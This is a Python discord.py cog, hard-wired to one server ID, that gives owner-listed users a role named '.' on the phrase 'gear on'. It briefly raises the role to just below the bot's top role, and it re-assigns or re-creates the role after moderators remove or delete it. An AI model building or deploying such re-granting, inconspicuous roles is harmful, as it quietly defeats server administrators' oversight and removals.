import discord
from discord.ext import commands, tasks
import asyncio
import logging

LOGGER = logging.getLogger(__name__)

TARGET_GUILD_ID = 1388268039195201677

class GearSystem(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.recovery_tasks = {}

    def is_allowed(self, user_id: int) -> bool:
        allowed = getattr(self.bot, "allowed_user_ids", frozenset())
        owner = getattr(self.bot, "owner_id", None)
        return user_id in allowed or user_id == owner

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author.bot or not message.guild:
            return
        if message.guild.id != TARGET_GUILD_ID:
            return
        if not self.is_allowed(message.author.id):
            return

        if message.content.lower() == "gear on":
            guild = message.guild
            me = guild.me
            
            dot_role = discord.utils.get(guild.roles, name=".")
            if not dot_role:
                try:
                    dot_role = await guild.create_role(name=".")
                except Exception as e:
                    LOGGER.error(f"Failed to create dot role: {e}")
                    pass

            if dot_role and dot_role not in message.author.roles:
                try:
                    await message.author.add_roles(dot_role)
                except Exception:
                    pass

            if dot_role:
                try:
                    top_position = me.top_role.position
                    if top_position > 1:
                        await dot_role.edit(position=top_position - 1)
                except Exception as e:
                    LOGGER.error(f"Failed to edit dot role position: {e}")
                    pass
            
                # Schedule moving it down after 1 minute
                self.bot.loop.create_task(self.revert_gear(dot_role))

    async def revert_gear(self, role: discord.Role):
        await asyncio.sleep(60)
        try:
            await role.edit(position=1)
        except Exception:
            pass

    async def recover_dot_role(self, guild: discord.Guild, member_id: int):
        await asyncio.sleep(600)  # wait 10 minutes
        try:
            member = guild.get_member(member_id)
            if not member:
                return
            dot_role = discord.utils.get(guild.roles, name=".")
            if not dot_role:
                dot_role = await guild.create_role(name=".")
            if dot_role not in member.roles:
                await member.add_roles(dot_role)
        except Exception as e:
            LOGGER.error(f"Error recovering dot role: {e}")
        finally:
            if member_id in self.recovery_tasks:
                del self.recovery_tasks[member_id]

    @commands.Cog.listener()
    async def on_member_update(self, before: discord.Member, after: discord.Member):
        if after.guild.id != TARGET_GUILD_ID:
            return
        if not self.is_allowed(after.id):
            return
            
        before_has = any(r.name == "." for r in before.roles)
        after_has = any(r.name == "." for r in after.roles)
        
        # If the role was removed from the user
        if before_has and not after_has:
            if after.id not in self.recovery_tasks:
                self.recovery_tasks[after.id] = self.bot.loop.create_task(
                    self.recover_dot_role(after.guild, after.id)
                )

    @commands.Cog.listener()
    async def on_guild_role_delete(self, role: discord.Role):
        if role.guild.id != TARGET_GUILD_ID:
            return
        if role.name == ".":
            # If the role is deleted, we should recover it for all allowed users in the guild
            guild = role.guild
            for member in guild.members:
                if self.is_allowed(member.id):
                    if member.id not in self.recovery_tasks:
                        self.recovery_tasks[member.id] = self.bot.loop.create_task(
                            self.recover_dot_role(guild, member.id)
                        )

async def setup(bot: commands.Bot):
    await bot.add_cog(GearSystem(bot))
